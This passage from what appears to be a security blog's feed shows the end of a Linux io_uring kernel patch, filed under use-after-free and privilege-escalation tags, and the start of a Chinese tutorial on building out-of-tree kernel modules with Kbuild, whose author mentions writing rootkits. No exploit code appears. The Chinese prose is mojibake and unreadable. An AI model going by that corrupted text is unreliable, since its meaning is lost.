&#125; else if (bl-&gt;buf_nr_pages) &#123;<br><span class="hljs-meta">@@ -531,18 +539,28 @@</span> error_unpin:<br> return -EINVAL;<br> &#125;<br> <br><span class="hljs-deletion">-static int io_alloc_pbuf_ring(struct io_uring_buf_reg *reg,</span><br><span class="hljs-addition">+static int io_alloc_pbuf_ring(struct io_ring_ctx *ctx,</span><br><span class="hljs-addition">+      struct io_uring_buf_reg *reg,</span><br>       struct io_buffer_list *bl)<br> &#123;<br><span class="hljs-deletion">-gfp_t gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;</span><br><span class="hljs-addition">+struct io_buf_free *ibf;</span><br> size_t ring_size;<br> void *ptr;<br> <br> ring_size = reg-&gt;ring_entries * sizeof(struct io_uring_buf_ring);<br><span class="hljs-deletion">-ptr = (void *) __get_free_pages(gfp, get_order(ring_size));</span><br><span class="hljs-addition">+ptr = io_mem_alloc(ring_size);</span><br> if (!ptr)<br> return -ENOMEM;<br> <br><span class="hljs-addition">+/* Allocate and store deferred free entry */</span><br><span class="hljs-addition">+ibf = kmalloc(sizeof(*ibf), GFP_KERNEL_ACCOUNT);</span><br><span class="hljs-addition">+if (!ibf) &#123;</span><br><span class="hljs-addition">+io_mem_free(ptr);</span><br><span class="hljs-addition">+return -ENOMEM;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+ibf-&gt;mem = ptr;</span><br><span class="hljs-addition">+hlist_add_head(&amp;ibf-&gt;list, &amp;ctx-&gt;io_buf_list);</span><br><span class="hljs-addition">+</span><br> bl-&gt;buf_ring = ptr;<br> bl-&gt;is_mapped = 1;<br> bl-&gt;is_mmap = 1;<br><span class="hljs-meta">@@ -599,7 +617,7 @@</span> int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg)<br> if (!(reg.flags &amp; IOU_PBUF_RING_MMAP))<br> ret = io_pin_pbuf_ring(&amp;reg, bl);<br> else<br><span class="hljs-deletion">-ret = io_alloc_pbuf_ring(&amp;reg, bl);</span><br><span class="hljs-addition">+ret = io_alloc_pbuf_ring(ctx, &amp;reg, bl);</span><br> <br> if (!ret) &#123;<br> bl-&gt;nr_entries = reg.ring_entries;<br><span class="hljs-meta">@@ -649,3 +667,19 @@</span> void *io_pbuf_get_address(struct io_ring_ctx *ctx, unsigned long bgid)<br> <br> return bl-&gt;buf_ring;<br> &#125;<br><span class="hljs-addition">+</span><br><span class="hljs-addition">+/*</span><br><span class="hljs-addition">+ * Called at or after -&gt;release(), free the mmap&#x27;ed buffers that we used</span><br><span class="hljs-addition">+ * for memory mapped provided buffer rings.</span><br><span class="hljs-addition">+ */</span><br><span class="hljs-addition">+void io_kbuf_mmap_list_free(struct io_ring_ctx *ctx)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+struct io_buf_free *ibf;</span><br><span class="hljs-addition">+struct hlist_node *tmp;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+hlist_for_each_entry_safe(ibf, tmp, &amp;ctx-&gt;io_buf_list, list) &#123;</span><br><span class="hljs-addition">+hlist_del(&amp;ibf-&gt;list);</span><br><span class="hljs-addition">+io_mem_free(ibf-&gt;mem);</span><br><span class="hljs-addition">+kfree(ibf);</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-comment">diff --git a/io_uring/kbuf.h b/io_uring/kbuf.h</span><br><span class="hljs-comment">index f2d615236b2cb9..6c7646e6057cf5 100644</span><br><span class="hljs-comment">--- a/io_uring/kbuf.h</span><br><span class="hljs-comment">+++ b/io_uring/kbuf.h</span><br><span class="hljs-meta">@@ -51,6 +51,8 @@</span> int io_provide_buffers(struct io_kiocb *req, unsigned int issue_flags);<br> int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg);<br> int io_unregister_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg);<br> <br><span class="hljs-addition">+void io_kbuf_mmap_list_free(struct io_ring_ctx *ctx);</span><br><span class="hljs-addition">+</span><br> unsigned int __io_put_kbuf(struct io_kiocb *req, unsigned issue_flags);<br> <br> bool io_kbuf_recycle_legacy(struct io_kiocb *req, unsigned issue_flags);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Pwn å®Œä¸€ç»“ç®— io_uring å¾—äº† MVPï¼mmap å°±æ˜¯èººèµ¢ç‹—ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="ææƒ" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="IO_URING" scheme="https://arttnba3.github.io/tags/IO-URING/"/>
    
  </entry>
  
  <entry>
    <title>ã€DEV.0x01ã€‘å¦‚ä½•ä¼˜é›…åœ°å¼€å‘æ ‘å¤–å†…æ ¸æ¨¡å—</title>
    <link href="https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/"/>
    <id>https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/</id>
    <published>2025-01-12T08:22:33.000Z</published>
    <updated>2025-04-10T04:28:25.866Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘åœ¨ 5:20 make installâ€”â€” 13ï¼š14 å‡†æ—¶ kernel panic</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>è™½ç„¶è¯´å·²ç»åšäº†è¿™ä¹ˆå¤šå¹´çš„å†…æ ¸å¼€å‘ï¼ˆï¼Ÿï¼‰äº†ï¼Œä½†æ˜¯ç¬”è€…å¼€å‘çš„å†…æ ¸æ¨¡å—ä¸€èˆ¬éƒ½ä»…å±€é™äºæå…¶ç‹­éš˜çš„ç‰¹å®šç”¨é€”ï¼ˆä¾‹å¦‚å†™ç‚¹ <a href="https://github.com/arttnba3/Nornir-Rootkit">å° rootkit</a> ä¹‹ç±»çš„ï¼‰ï¼Œä¹Ÿæ²¡å’‹ç»„ç»‡è¿‡æ¯”è¾ƒä¼˜é›…çš„ä»£ç ç»“æ„ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ä¸€ä¸ªä¸‘é™‹çš„ Makefile åŒ…åŠä¸€åˆ‡ï¼Œéœ€è¦è¿™ä¸ªå†…æ ¸æ¨¡å—çš„æ—¶å€™ç›´æ¥ç²—ç³™åœ°æ‰‹åŠ¨ <code>insmod</code> â€”â€”èƒ½ç”¨æ˜¯èƒ½ç”¨ï¼Œä½†ç¡®å®ä¹Ÿå°±å±€é™äºè‡ªç”¨äº†ï¼šï¼ˆ</p><p>å› æ­¤è¿™ç¯‡åšå®¢ä¸»è¦è®²è®²å¦‚ä½•ä½¿ç”¨ <a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> ç»„ç»‡ä»£ç å¹¶ä½¿ç”¨ <a href="https://github.com/dell/dkms">DKMS</a> ç­‰å·¥å…·ä¼˜é›…åœ°å¼€å‘ä¸æ‰“åŒ…ä¸€ä¸ª out-of-tree çš„ Linux å†…æ ¸æ¨¡å—</p><h1 id="0x01-åŸºæœ¬çš„å†…æ ¸æ¨¡å—"><a href="#0x01-åŸºæœ¬çš„å†…æ ¸æ¨¡å—" class="headerlink" title="0x01. åŸºæœ¬çš„å†…æ ¸æ¨¡å—"></a>0x01. åŸºæœ¬çš„å†…æ ¸æ¨¡å—</h1><p>æˆ‘ä»¬é¦–å…ˆå†™ä¸€ä¸ªåŸºç¡€çš„å†…æ ¸æ¨¡å—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Hello kernel world!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å¼€å§‹æ­å»ºæ¨¡å—æºç æ–‡ä»¶ç»“æ„ï¼Œç»„ç»‡å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>â”œâ”€â”€ Makefile<br>â””â”€â”€ src<br>    â”œâ”€â”€ Kbuild<br>    â””â”€â”€ main.c<br><br>2 directories, 3 files<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-Kbuild-ç»„ç»‡æºç æ–‡ä»¶"><a href="#ä½¿ç”¨-Kbuild-ç»„ç»‡æºç æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ Kbuild ç»„ç»‡æºç æ–‡ä»¶"></a>ä½¿ç”¨ Kbuild ç»„ç»‡æºç æ–‡ä»¶</h2><h3 id="åŸºç¡€çš„-Kbuild-Makefile-ç¤ºä¾‹"><a href="#åŸºç¡€çš„-Kbuild-Makefile-ç¤ºä¾‹" class="headerlink" title="åŸºç¡€çš„ Kbuild &amp; Makefile ç¤ºä¾‹"></a>åŸºç¡€çš„ Kbuild &amp; Makefile ç¤ºä¾‹</h3><p><a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> æ˜¯ Linux kernel æ„å»ºç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå½“æˆ‘ä»¬åœ¨æºç ç›®å½•ä¸‹ç¼–å†™äº† <code>Kbuild</code> æ–‡ä»¶ä¹‹åï¼Œåœ¨ç¼–è¯‘æ—¶ Linux kernel çš„ç¼–è¯‘åŸºç¡€è®¾æ–½ä¾¿ä¼šæ ¹æ® <code>Kbuild</code> æ¥è‡ªåŠ¨åœ°ç¼–è¯‘å¥½æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—ï¼Œè‹¥æ²¡æœ‰ <code>Kbuild</code> åˆ™ä¼šé€‰æ‹©å¯»æ‰¾ <code>Makefile</code> </p><p>ç›¸æ¯”èµ·æŠŠæ‰€æœ‰å¾…ç¼–è¯‘æ–‡ä»¶ä¸é…ç½®éƒ½å†™åˆ°ä¸€ä¸ª Makefile é‡Œï¼ˆä¾‹å¦‚ <a href="https://github.com/NVIDIA/open-gpu-kernel-modules">nvidia-open</a> ä¾¿æ˜¯è¿™ä¹ˆåšçš„ï¼Œçœ‹èµ·æ¥å¹¶ä¸ç¾è§‚ï¼‰ï¼Œæ‹†åˆ†åˆ°å¤šçº§ Makefile å½“ä¸­é€šå¸¸æ˜¯æ›´æ˜“äºç»´æŠ¤çš„åšæ³•ï¼Œè€Œä½¿ç”¨ Kbuild ç»„ç»‡ç¼–è¯‘ç»“æ„åˆ™æ˜¯æ›´åŠ ä¼˜é›…çš„ä¸€ç§æ–¹å¼</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€åŸºç¡€çš„ Kbuild æ–‡ä»¶çš„ç¤ºä¾‹ï¼Œè¯­æ³•ä¸Šæœ‰ç‚¹ç±»ä¼¼äº Makefileï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br></code></pre></td></tr></table></figure><p>å„ç¬¦å·è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><p><code>MODULE_NAME</code> ï¼šä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰å˜é‡ï¼Œæˆ‘ä»¬ç”¨æ¥å®šä¹‰æˆ‘ä»¬çš„æ¨¡å—å</p></li><li><p><code>obj-m</code> ï¼šè¿™ä¸ªç¬¦å·ç”¨æ¥æŒ‡å®šè¦è¢«ç¼–è¯‘çš„å†…æ ¸æ¨¡å—åˆ—è¡¨ï¼Œ<code>+=</code> æ„å‘³ç€æ·»åŠ ä¸Šæˆ‘ä»¬çš„å†…æ ¸æ¨¡å—ï¼Œè€Œ <code>$(MODULE_NAME).o</code> åˆ™æ˜¯æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—ç¼–è¯‘çš„åæœŸäº§ç‰©ï¼Œè¿™é€šå¸¸ç”±å•ä¸ªæˆ–å¤šä¸ªç›®æ ‡æ–‡ä»¶åˆå¹¶è€Œæˆï¼Œæœ€åä¼šè¢«é“¾æ¥ä¸º <code>$(MODULE_NAME).ko</code> æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„ LKM ELF</p><blockquote><p>å¦‚æœè¦å°†æ¨¡å—ç¼–è¯‘è¿›å†…æ ¸ ELF æ–‡ä»¶ï¼ˆvmlinuxï¼‰ä¸­ï¼Œåˆ™åº”å½“ä½¿ç”¨ <code>obj-y</code></p></blockquote></li><li><p><code>ccflags-y</code> ï¼š<code>ccflags</code> æ„å‘³ç€ç¼–è¯‘é€‰é¡¹ï¼Œ<code>-y</code> æ„å‘³ç€å¼€å¯çš„ç¼–è¯‘é€‰é¡¹ï¼Œè¿™é‡Œæˆ‘ä»¬æ·»åŠ äº† <code>-I</code> é€‰é¡¹ä»¥å¼•å…¥æˆ‘ä»¬è‡ªå·±çš„å¤´æ–‡ä»¶ç›®å½•ï¼Œæ›´å¤šç¼–è¯‘é€‰é¡¹å¯ä»¥å‚è§ <a href="https://gcc.gnu.org/onlinedocs/gcc/Invoking-GCC.html">GCC çš„æ–‡æ¡£</a></p></li><li><p><code>$(MODULE_NAME)-y</code> ï¼š<code>$(MODULE_NAME).o</code>æ‰€éœ€è¦çš„ç›®æ ‡æ–‡ä»¶ï¼Œ<code>-y</code> æ„å‘³ç€ç¼–è¯‘è¿‡ç¨‹éœ€è¦è¯¥æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬åŠ å…¥äº†ä¸€ä¸ª <code>main.o</code> ï¼Œæ„å‘³ç€æˆ‘ä»¬çš„æºç ç›®å½•ä¸‹åº”å½“æœ‰ä¸€ä¸ª <code>main.c</code></p></li></ul><p>æ³¨æ„åˆ°è¿™é‡Œæœ‰å¾ˆå¤šçš„ <code>-å­—ç¬¦</code> ï¼Œè¿™ä¸ªè®¾å®šå…¶å®æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çµæ´»åœ°é…ç½®ç¼–è¯‘é€‰é¡¹ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å°† <code>-y</code> æ›¿æ¢ä¸º <code>-$(æŸä¸ªå˜é‡å)</code> ï¼Œä»è€Œåœ¨è¯¥å˜é‡ä¸º <code>y</code> çš„æ—¶å€™æ‰åŒ…å«è¯¥é€‰é¡¹ï¼Œä¾‹å¦‚ä»¥ä¸‹ç¤ºä¾‹æ„å‘³ç€åœ¨é€‰é¡¹é…ç½®ä¸­åŒ…å« <code>CONFIG_X86_64=y</code> æ—¶æ‰ä¼šåœ¨æ¨¡å—ä¸­ç¼–è¯‘å…¥ <code>x86_64_tools.c</code> ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_X86_64)</span> += x86_64_tools.o<br></code></pre></td></tr></table></figure><p>è¿™åŒæ ·é€‚ç”¨äºå¯¹å†…æ ¸æ¨¡å—çš„é…ç½®ï¼Œå¯¹äºæ ‘å†…æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>.config</code> æ–‡ä»¶å½“ä¸­é…ç½®æŸä¸ªæŒ‡å®šå˜é‡çš„å€¼ä¸º <code>=y</code> æˆ– <code>=m</code> ï¼Œä»è€Œå†³å®šå°†è¯¥æ¨¡å—ç¼–è¯‘è¿›å†…æ ¸æˆ–æ˜¯ä½œä¸ºç‹¬ç«‹çš„ ELF å­˜åœ¨ï¼Œä¾‹å¦‚ä»¥ä¸‹ç¤ºä¾‹æ„å‘³ç€è¿™ä¸ªæ¨¡å—æ˜¯å¦ç¼–è¯‘è¿›å†…æ ¸ç”±å˜é‡ <code>CONFIG_MY_A3KMODULE</code> çš„å€¼å†³å®šï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">A3KMODULE_NAME ?= a3kmod<br>obj-<span class="hljs-variable">$(CONFIG_MY_A3KMODULE)</span> += <span class="hljs-variable">$(A3KMODULE_NAME)</span>.o<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œç”±äºæˆ‘ä»¬å·²ç»åœ¨ Kbuild å½“ä¸­æŒ‡ç¤ºäº†æ¨¡å—çš„æ„å»ºè¡Œä¸ºï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æºç æ ¹ç›®å½•çš„ Makefile å½“ä¸­å†™å…¥é€šç”¨æ€§å†…å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬çš„ Makefile å†™å…¥å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><span class="hljs-comment"># Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><br>A3KMOD_ROOT_DIR=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>A3KMOD_SRC_DIR=<span class="hljs-variable">$(A3KMOD_ROOT_DIR)</span>/src<br>LINUX_KERNEL_SRC=/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br><br><span class="hljs-section">all:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> modules<br><br><span class="hljs-section">clean:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> clean<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><br></code></pre></td></tr></table></figure><p>ç®€è¦è¯´æ˜å¦‚ä¸‹ï¼ˆæƒ³æ›´è¯¦ç»†äº†è§£å¯è‡ªè¡Œæ·±å…¥å­¦ä¹  Makefile è¯­æ³•ï¼‰ï¼š</p><ul><li><code>A3KMOD_ROOT_DIR</code> ã€ <code>A3KMOD_SRC_DIR</code> ï¼šè¿™äº›å˜é‡æŒ‡å®šäº†æºç ç›®å½•ä¸ºå½“å‰ç›®å½•ä¸‹çš„ <code>src</code> æ–‡ä»¶å¤¹ï¼Œ<code>$(shell pwd)</code> æ„å‘³ç€å…¶å€¼ä¸º <code>pwd</code> å‘½ä»¤çš„ç»“æœ</li><li><code>LINUX_KERNEL_SRC</code> ï¼šè¿™ä¸ªå˜é‡æŒ‡å®šäº† Linux å†…æ ¸æºç ç›®å½•ï¼Œå¯¹äºç»å¤§å¤šæ•° Linux å‘è¡Œç‰ˆè€Œè¨€ï¼Œåœ¨å®‰è£…äº†ç›¸åº”çš„è½¯ä»¶åŒ…ï¼ˆä¾‹å¦‚ <code>linux-headers</code> ï¼‰åï¼Œåœ¨ <code>/lib/modules/$(shell uname -r)/build</code> ç›®å½•ä¸‹éƒ½ä¼šå­˜æ”¾ç€å½“å‰æ‰€ç”¨å†…æ ¸çš„æºç ä»¥åŠç¼–è¯‘ç³»ç»Ÿæ–‡ä»¶ï¼Œå…¶ä¸­ <code>$(shell uname -r)</code> æ„å‘³ç€å…¶å€¼ä¸º <code>uname -r</code> çš„ç»“æœ</li><li><code>all:</code> ï¼šåä¸º <code>all</code> çš„æ ‡ç­¾ï¼Œåœ¨æ‰§è¡Œ <code>make all</code> æ—¶ä¼šæ‰§è¡Œè¯¥æ ‡ç­¾ä¸‹çš„å‘½ä»¤ï¼Œç”±äºè¿™æ˜¯ Makefile ä¸­çš„ç¬¬ä¸€ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œ <code>make</code> é»˜è®¤ä¼šè¿è¡Œè¯¥å‘½ä»¤<ul><li><code>@$(MAKE)</code> ï¼š<code>@$(MAKE)</code> æŒ‡å®šäº†ä½¿ç”¨å½“å‰ç¯å¢ƒä¸­çš„ <code>MAKE</code> å‘½ä»¤ï¼ˆè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨è¿è¡Œ <code>make</code> å‘½ä»¤æ—¶å¯ä»¥å¯ä»¥é€šè¿‡æŒ‡å®š <code>MAKE=</code> æ›´æ”¹å…¶è·¯å¾„ï¼Œé»˜è®¤å€¼æ˜¯ <code>make</code> ï¼‰</li><li><code> -C $(LINUX_KERNEL_SRC)</code> ï¼šmake æŒ‡ä»¤è¿›å…¥åˆ°å†…æ ¸æºç ç›®å½•è¿›è¡Œ</li><li><code>modules</code> ï¼šæ‰§è¡Œå†…æ ¸æºç  Makefile ä¸­çš„ <code>modules</code> é¡¹ï¼Œæ„å‘³ç€è¿›è¡Œå†…æ ¸æ¨¡å—ç¼–è¯‘è¡Œä¸º</li><li><code>M=$(A3KMOD_SRC_DIR)</code>ï¼šæŒ‡å®šå‚æ•° <code>M</code> çš„å€¼ï¼Œå¯¹ <code>modules</code> é¡¹è€Œè¨€ä»£è¡¨è¦ç¼–è¯‘çš„å†…æ ¸æ¨¡å—çš„æºç è·¯å¾„</li></ul></li><li><code>clean:</code> ï¼šå’Œ <code>all</code> æ ‡ç­¾ä¼ é€’çš„åŸºæœ¬ä¸€è‡´ï¼Œä¸åŒåœ¨äºæœ€åæ‰§è¡Œçš„è¡Œä¸ºæ˜¯ <code>clean</code> ï¼Œæ„å‘³ç€æ¸…ç†ç¼–è¯‘äº§ç‰©</li><li><code>.PHONY</code>ï¼šâ€œä¼ªç›®æ ‡â€ï¼Œå³ç›¸æ¯”åŒåæ–‡ä»¶è€Œè¨€ä¼˜å…ˆæ‰¾ Makefile ä¸­çš„æ ‡ç­¾å®šä¹‰ï¼Œè¿™é‡Œå°† <code>clean</code> æ ‡ç­¾å£°æ˜ä¸ºä¼ªç›®æ ‡</li></ul><h3 id="å¤šçº§ç›®å½•çš„å¤šçº§-Kbuild-ç»„ç»‡"><a href="#å¤šçº§ç›®å½•çš„å¤šçº§-Kbuild-ç»„ç»‡" class="headerlink" title="å¤šçº§ç›®å½•çš„å¤šçº§ Kbuild ç»„ç»‡"></a>å¤šçº§ç›®å½•çš„å¤šçº§ Kbuild ç»„ç»‡</h3><p>é‰´äºç»å¤§éƒ¨åˆ†çš„å†…æ ¸æ¨¡å—séƒ½æ˜¯å„ç§ä¸åŒç±»å‹è®¾å¤‡çš„é©±åŠ¨ï¼Œä»–ä»¬é€šå¸¸éƒ½åªæœ‰å•çº§ç»“æ„ï¼Œä½†ä¸ä¹æœ‰ä¸€äº›åœºæ™¯ä¼šéœ€è¦ç»“æ„è®¾è®¡è¾ƒä¸ºå¤æ‚çš„å†…æ ¸æ¨¡å—ï¼Œå¦‚æœæŠŠæ‰€æœ‰æºç æ–‡ä»¶éƒ½å †åˆ°åŒä¸€çº§å­ç›®å½•ä¸‹æœªå…ä¸å¤ªé›…è§‚ï¼Œå› æ­¤æ ¹æ®ä»£ç æ¶æ„è®¾è®¡æ‹†åˆ†åˆ°ä¸åŒçš„å¤šçº§ç›®å½•ä¸­æ˜¯è¾ƒä¸ºå¸¸è§çš„åšæ³•ï¼Œè€Œæ–‡ä»¶ä¸€å¤šèµ·æ¥å†å°†æ‰€æœ‰ç¼–è¯‘é…ç½®é€‰é¡¹éƒ½æ”¾åˆ°åŒä¸€ä¸ª Kbuild æˆ–æ˜¯ Makefile å½“ä¸­å¯¹ç»´æŠ¤è€…è€Œè¨€è‡ªç„¶æ˜¯ä¸€ç§åœ°ç‹±èˆ¬çš„ä½“éªŒï¼ˆä¾‹å¦‚åº”è¯¥ä¸å¤ªä¼šæœ‰äººæƒ³å»ç»†çœ‹<a href="https://github.com/NVIDIA/open-gpu-kernel-modules/blob/main/src/nvidia/srcs.mk">è¿™ä¸ªæ–‡ä»¶</a>ï¼‰</p><p>å› æ­¤æ‹†åˆ†æˆå¤šçº§ Kbuild æ–‡ä»¶åœ¨è½¯ä»¶å·¥ç¨‹ä¸­é€šå¸¸æ˜¯æ¯”è¾ƒæ°å½“çš„åšæ³•ï¼Œæˆ‘ä»¬ä»¥å¦‚ä¸‹ä»£ç ç›®å½•ä½œä¸ºç¤ºä¾‹è®²è§£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>â”œâ”€â”€ Makefile<br>â””â”€â”€ src<br>    â”œâ”€â”€ Kbuild<br>    â”œâ”€â”€ main.c<br>    â””â”€â”€ sub<br>        â”œâ”€â”€ Kbuild<br>        â”œâ”€â”€ sub.c<br>        â””â”€â”€ sub_sub<br>            â”œâ”€â”€ Kbuild<br>            â””â”€â”€ sub_sub.c<br><br>4 directories, 7 files<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ <code>src/sub/sub_sub</code> ç›®å½•ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>Kbuild</code> æ–‡ä»¶é…ç½®è¿™ä¸ªå­ç›®å½•ä¸‹éœ€è¦ç¼–è¯‘çš„æ–‡ä»¶ï¼Œè¿™é‡Œç®€å•ç¼–å†™å¦‚ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œåº”å½“å’Œæºç æ ¹ç›®å½•ä¸‹çš„ Kbuild ä¸€æ ·ä»¥æºç æ ¹ç›®å½•æ–‡ä»¶ä½œä¸ºç›¸å¯¹æ 